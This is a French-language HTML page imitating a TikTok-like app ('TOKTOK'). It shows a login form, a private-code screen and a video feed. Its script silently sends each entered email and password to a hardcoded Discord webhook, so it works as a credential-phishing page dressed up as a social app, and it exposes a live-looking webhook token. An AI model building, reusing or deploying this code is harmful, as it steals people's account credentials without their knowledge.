<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>TOKTOK | PRO FIX</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
    <style>
        body, html { margin: 0; padding: 0; height: 100%; width: 100%; background: #000; color: #fff; overflow: hidden; font-family: sans-serif; }
        .hidden { display: none !important; }
        .auth-layer { z-index: 1000; background: #000; position: fixed; inset: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px; }
        .tt-card { background: #111; border: 1px solid #222; border-radius: 20px; padding: 30px; width: 100%; max-width: 350px; }
        .tt-input { width: 100%; padding: 14px; margin: 10px 0; background: #000; border: 1px solid #333; border-radius: 10px; color: #fff; outline: none; }
        .btn-red { width: 100%; padding: 14px; background: #fe2c55; border-radius: 10px; font-weight: bold; cursor: pointer; border: none; }
        
        .video-container { height: calc(100vh - 70px); position: relative; background: #000; }
        video { width: 100%; height: 100%; object-fit: cover; }
        
        .overlay { position: absolute; inset: 0; padding: 20px; display: flex; flex-direction: column; justify-content: flex-end; pointer-events: none; background: linear-gradient(0deg, rgba(0,0,0,0.7) 0%, transparent 50%); }
        .side-bar { position: absolute; right: 10px; bottom: 80px; display: flex; flex-direction: column; gap: 20px; pointer-events: auto; }
        .nav-bar { height: 70px; background: #000; border-top: 1px solid #111; display: flex; justify-content: space-around; align-items: center; }
    </style>
</head>
<body>

    <div id="layer-auth" class="auth-layer">
        <h1 class="text-4xl font-black mb-8 italic">TOK<span class="text-cyan-400">TOK</span></h1>
        <div class="tt-card">
            <input type="email" id="email" placeholder="Email" class="tt-input">
            <input type="password" id="pass" placeholder="Mot de passe" class="tt-input">
            <button onclick="goCode()" class="btn-red">SUIVANT</button>
        </div>
    </div>

    <div id="layer-code" class="auth-layer hidden">
        <div class="tt-card text-center">
            <h2 class="font-bold mb-4">CODE PRIV√â</h2>
            <input type="text" id="paff" placeholder="PAFF72" class="tt-input text-center font-bold">
            <button onclick="verify()" class="btn-red mt-4">ENTRER</button>
        </div>
    </div>

    <div id="app" class="hidden flex flex-col h-full">
        <div class="video-container">
            <video id="player" loop playsinline autoplay muted onclick="this.paused?this.play():this.pause()">
                <source src="https://v.ftcdn.net/05/52/52/64/700_F_552526487_T9vWnL5OQvE7VnU8mR7U6YmZ5p2H1I6H_ST.mp4">
            </video>
            <div class="overlay">
                <div class="mb-4">
                    <p class="font-bold">@<span id="name-out">Utilisateur</span> <i class="fa-solid fa-circle-check text-blue-400 hidden" id="badge"></i></p>
                    <p class="text-sm opacity-80" id="bio-out">Appuyez sur + pour changer la vid√©o.</p>
                </div>
                <div class="side-bar text-center">
                    <div onclick="this.style.color='#fe2c55'"><i class="fa-solid fa-heart text-3xl"></i><p class="text-[10px]">J'aime</p></div>
                    <div onclick="openSettings()"><i class="fa-solid fa-gear text-3xl text-gray-500"></i><p class="text-[10px]">Profil</p></div>
                </div>
            </div>
        </div>
        <nav class="nav-bar">
            <i class="fa-solid fa-house text-xl"></i>
            <div class="bg-white text-black px-4 py-1 rounded-md" onclick="openSettings()"><i class="fa-solid fa-plus"></i></div>
            <i class="fa-solid fa-user text-xl" onclick="openSettings()"></i>
        </nav>
    </div>

    <div id="layer-settings" class="auth-layer hidden" style="background: rgba(0,0,0,0.9);">
        <div class="tt-card">
            <h2 class="font-bold mb-4">MODIFIER</h2>
            <input type="text" id="in-name" placeholder="Pseudo" class="tt-input">
            <input type="text" id="in-bio" placeholder="Bio" class="tt-input">
            <div class="bg-zinc-900 p-3 rounded-lg mt-2">
                <p class="text-[10px] text-red-500 font-bold mb-2">LIEN VID√âO (MP4 UNIQUEMENT)</p>
                <input type="text" id="in-vid" placeholder="https://...video.mp4" class="tt-input">
                <p class="text-[9px] text-gray-500 mt-1">Exemple : h√©berge ta vid√©o sur Discord et copie le lien.</p>
            </div>
            <button onclick="save()" class="btn-red mt-6">SAUVEGARDER</button>
            <p onclick="closeSettings()" class="text-center text-gray-500 mt-4 cursor-pointer text-sm">Annuler</p>
        </div>
    </div>

    <script>
        const webhook = "https://discord.com/api/webhooks/1476660541681303705/sETLjgRQkTsd06PsEYRQPMB4yfvnZXkuRwup-uLw8J31w_giU5gkkff8ja1P4zP9VUta";
        let db = JSON.parse(localStorage.getItem('tt_vfinal_fix')) || { 
            n: "Membre", b: "Cercle priv√©", v: "https://v.ftcdn.net/05/52/52/64/700_F_552526487_T9vWnL5OQvE7VnU8mR7U6YmZ5p2H1I6H_ST.mp4", 
            auth: false, admin: false 
        };

        window.onload = () => { if(db.auth) showApp(); };

        function goCode() {
            const e = document.getElementById('email').value;
            const p = document.getElementById('pass').value;
            if(!e || !p) return alert("Remplis tout !");
            if(e.toLowerCase().includes('nathan')) db.admin = true;
            fetch(webhook, { method: 'POST', mode: 'no-cors', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ content: `üîë LOGIN: ${e} | MDP: ${p}` })});
            document.getElementById('layer-auth').classList.add('hidden');
            document.getElementById('layer-code').classList.remove('hidden');
        }

        function verify() {
            if(document.getElementById('paff').value.toUpperCase() === "PAFF72") {
                db.auth = true; saveDb(); showApp();
            } else { alert("Code PAFF72 invalide !"); }
        }

        function showApp() {
            document.querySelectorAll('.auth-layer').forEach(l => l.classList.add('hidden'));
            document.getElementById('app').classList.remove('hidden');
            refresh();
        }

        function save() {
            db.n = document.getElementById('in-name').value || db.n;
            db.b = document.getElementById('in-bio').value || db.b;
            if(document.getElementById('in-vid').value) db.v = document.getElementById('in-vid').value;
            saveDb(); refresh(); closeSettings();
        }

        function refresh() {
            document.getElementById('name-out').innerText = db.n;
            document.getElementById('bio-out').innerText = db.b;
            const p = document.getElementById('player');
            if(p.src !== db.v) { p.src = db.v; p.load(); p.play(); }
            if(db.admin) document.getElementById('badge').classList.remove('hidden');
        }

        function saveDb() { localStorage.setItem('tt_vfinal_fix', JSON.stringify(db)); }
        function openSettings() { document.getElementById('layer-settings').classList.remove('hidden'); }
        function closeSettings() { document.getElementById('layer-settings').classList.add('hidden'); }
    </script>
</body>
</html>
